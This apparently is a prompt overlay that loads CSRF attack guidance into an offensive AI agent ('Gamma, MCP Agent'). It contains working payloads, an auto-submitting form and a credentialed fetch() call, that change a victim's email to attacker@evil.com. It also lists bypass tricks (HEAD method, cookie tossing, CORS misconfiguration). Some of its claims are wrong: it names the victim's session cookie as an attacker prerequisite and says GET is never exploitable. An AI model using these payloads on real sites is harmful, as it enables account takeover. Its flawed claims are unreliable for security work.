# CSRF — Dynamic Overlay

## Metadata
- **Exploit Type**: csrf
- **Applies To**: Gamma, MCP Agent
- **Loading**: Appended when `exploit_type === "csrf"`

---

## OVERLAY_CONTEXT

Cross-Site Request Forgery (CSRF) exploits the browser's automatic inclusion of cookies/credentials in requests. Success indicators: state-changing actions performed on behalf of the victim (password change, email change, privilege escalation).

---

## Attack Prerequisites

```
1. Valid session cookie or token for the victim
2. Predictable/known request parameters
3. Server trusting the Origin/Referer header (or no CSRF token)
```

---

## CSRF Token Extraction

### From HTML Forms
```html
<form action="/api/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123xyz">
```

### From API Responses
```
GET /api/profile
Response: {"csrf_token": "abc123xyz", ...}
```

### From Cookies (double-submit pattern)
```
Cookie: csrf_cookie=abc123xyz
(Also sent as header or body)
```

---

## Exploit Strategies

### Auto-Submit Form
```html
<html>
<body>
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="STOLEN_TOKEN">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### Fetch-based (no form)
```javascript
fetch('https://target.com/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com', csrf_token: 'STOLEN_TOKEN'})
});
```

---

## Bypass Techniques

### HEAD Method Bypass
```
If server processes HEAD requests but doesn't validate CSRF on HEAD:
HEAD /api/action HTTP/1.1
```

### Cookie toss
```
Set cookie in your response: csrf_cookie=valid
Victim's browser sends it automatically
```

### CORS Misconfiguration
```
If server has: Access-Control-Allow-Credentials: true
And allows attacker Origin: attacker.com
You can forge requests from attacker.com
```

---

## Constraints

```
- CSRF only works against state-changing actions (GET is not exploitable)
- Need victim's browser to be logged in to target
- Auto-submit forms require the victim to visit your page
- CORS bypass only works if server explicitly allows your origin
- Check SameSite cookie attribute: Lax/Strict blocks most CSRF
```

---

*Overlay version: 1.0*
